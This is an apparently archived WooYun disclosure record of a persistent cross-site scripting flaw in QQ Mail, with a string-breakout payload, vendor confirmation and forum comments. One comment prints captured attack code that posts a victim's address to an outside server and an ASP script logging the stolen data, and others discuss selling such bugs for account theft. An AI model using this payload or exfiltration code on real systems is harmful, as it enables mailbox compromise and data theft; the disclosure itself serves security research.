{"id": 22464, "wybug_id": "wooyun-2011-02335", "wybug_title": "QQ邮箱跨站", "wybug_corp": "腾讯", "wybug_author": "s!lly3r", "wybug_date": "2011-06-29 01:12", "wybug_open_date": "2011-07-29 03:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "用户敏感数据泄漏", "利用技巧", "利用", "敏感接口", "发生点上下文敏感", "黑盒测试技巧", "漏洞分析技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-29：\t细节向公众公开  简要描述： QQ邮箱跨站,非本地,可发送,点击收件箱列表即触发. 详细说明：  测试过程使用firebug;第一步:写信,填写好目的邮箱标题内容,然后打开firebug搜索\"xqqstyle\",编辑html把id为xqqstyle的输入框显示出来.直接修改值貌似不行,没去看 哈哈 ^_^.如图\n\n第二步:在显示出来的输入框里输入\n14','9999');alert('Owned by s!lly3r');//\n如图\n\n第三步:发送^_^,对方点击收件箱列表出来华丽的框框.如图\n\n最终呈现的代码是\n\n   漏洞证明：  \n\n\n\n   修复方案：  ^_^   版权声明：转载请注明来源 s!lly3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2011-06-30 11:40 厂商回复： 非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-06-29 02:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  只能说牛逼大了 半夜不睡的都很牛逼    \n     2011-06-29 05:12 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  刚刚春梦的路过    \n     2011-06-29 09:30 |    \t\t左右 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | 左右 ? 左. : 右.)\t\t \n  熊猫大侠啊~~~    \n     2011-06-29 10:09 |    \t\t狗样的男人 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        )\t\t \n  这个可以牛逼- -    \n     2011-06-29 13:15 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  以前有人向我兜售这个洞..    \n     2011-06-29 13:22 |    \t\tjsbug \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        )\t\t \n  彩色标题?    \n     2011-06-29 13:34 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  顶啊!    \n     2011-06-29 14:12 |    \t\ts!lly3r \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:2        )\t\t \n  jsbug威武,弱弱问下这样东西能卖?求black market内幕    \n     2011-06-29 14:18 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  嗯,当然能卖,用来挂马 盗号什么的,很值钱,我有时候也收来转手你懂的     \n     2011-06-29 15:37 |    \t\tjsbug \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        )\t\t \n  我恨我猜对了啊.    \n     2011-06-29 17:05 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  这牛逼···    \n     2011-06-29 18:05 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  卖给lake2 他专收这个    \n     2011-06-30 09:16 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  大牛啊！！！    \n     2011-07-03 14:33 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  helen 被人中招了 <DIV id=abcb_ext1 title=\"<form name='my_form_' method='post' action=' http://210.40.132.155/Setting/a.asp' target='my_frame1_' > <input type='hidden' name='my_data_mail' value='305536777@qq.com'><input type='hidden' name='my_data_exte' value=''></form><iframe id='my_frame1_' height=0 name='my_frame1_' frameborder=0 scrolling=no></iframe> \" style=\"DISPLAY: none\"></DIV><XMP></XMP> <STYLE type=text/css>#02 {layout-grid-line:\"</XMP> \"}</STYLE> <XMP></XMP></DIV> 这个是我们分析的 中招代码 接收代码 <% Function Format_Time(s_Time, n_Flag) Dim y, m, d, h, mi, s Format_Time = \"\" If IsDate(s_Time) = False Then Exit Function y = cstr(year(s_Time)) m = cstr(month(s_Time)) If len(m) = 1 Then m = \"0\" & m d = cstr(day(s_Time)) If len(d) = 1 Then d = \"0\" & d h = cstr(hour(FormatDateTime(s_Time, 4))) If len(h) = 1 Then h = \"0\" & h mi = cstr(minute(s_Time)) If len(mi) = 1 Then mi = \"0\" & mi s = cstr(second(s_Time)) If len(s) = 1 Then s = \"0\" & s Select Case n_Flag Case 0 ' yyyy-mm-dd_hh:mm:ss Format_Time = y & \"-\" & m & \"-\" & d & \"_\" & h & \":\" & mi & \":\" &s Case 1 ' yyyy-mm-dd hh:mm:ss Format_Time = y & \"-\" & m & \"-\" & d & \" \" & h & \":\" & mi & \":\" & s End Select End Function %> <% filename=\"tet.txt\" set fso = Server.CreateObject(\"Scripting.FileSystemObject\") set fout = fso.OpenTextFile(server.mappath(\"\" & filename & \"\"), 8, true) ret1 = Request.Form(\"my_data_mail\") ret2 = Request.Form(\"my_data_exte\") userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\") If userip = \"\" Then userip = Request.ServerVariables(\"REMOTE_ADDR\") //IP End If str1 = replace(ret1, \"%20\", \"\") str2 = replace(ret2, \";%20\", \";\") if len(str1) > 7 And len(str2) > 20 Then fout.write Format_Time(now(), 0) & \" \" & str1 & \"(\" & userip & \")*\" & str2 & chr(13) & chr(10) End If set fout=nothing set fso=nothing %> my_data_exte my_data_mail 应该是 以前类似QQ空间 key的运用那些人进了helen邮箱想社helen支付宝 但是helen有U盾 嘎嘎！    \n     2011-07-29 10:36 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  赞 这个漏洞太经典了！！    \n     2011-07-29 14:49 |    \t\tyoustar \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 我们人啊~)\t\t \n  这个洞给力呀    \n     2011-07-30 10:40 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  看来QQ邮箱的XSS还是蛮多的。     \n     2012-02-12 15:35 |    \t\tpestu \t\t\t( 普通白帽子  |\t\t\t        Rank:170 漏洞数:13        | 关注计算机网络安全 lnmpa技术)\t\t \n  经典 学习了    \n     2013-08-23 22:21 |    \t\tNight \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:16        )\t\t \n  给力了。    \n     2014-08-27 21:34 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  史前教科书留名    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}